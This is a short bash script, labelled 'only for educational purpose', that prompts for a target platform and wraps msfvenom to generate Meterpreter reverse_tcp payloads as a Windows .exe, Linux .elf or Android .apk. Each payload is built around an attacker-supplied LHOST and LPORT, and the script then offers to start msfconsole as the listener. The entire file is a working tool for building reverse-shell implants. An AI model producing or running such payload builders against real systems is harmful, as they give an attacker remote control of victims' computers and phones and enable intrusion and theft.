#!/bin/bash

echo " only for educational purpose"
echo "(1) windows payload"
echo "(2) linux payload"
echo "(3)android payload"
echo ""
read -p "Enter you number: " pay
echo ""
echo""
echo "Pls wait"
if [ $pay == 1 ]
then
echo "Creating payload for windows"
read -p "Enter your lhost: " s
read -p "Enter your lport: " s1
read -p "Enter you payload name: " z

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$s LPORT=$s1 -f exe -o $z.exe

elif [ $pay == 2 ]
then
read -p "Enter your lhost: " s
read -p "Enter your lport: " s1
read -p "Enter you payload name: " z

msfvenom -p linux/meterpreter/reverse_tcp LHOST=$s LPORT=$s1 -f elf -o $z.elf

echo ""

else

read -p "Enter your lhost: " s
read -p "Enter your lport: " s1
read -p "Enter you payload name: " z

msfvenom -p android/meterpreter/reverse_tcp LHOST=$s LPORT=$s1 -f raw -o $z.apk

echo "thank you for using"

fi

read -p "Do you want start listener(yes,no)" a

if [ $a == yes ]
then
msfconsole

else

echo ""
echo "thanks for using"

fi

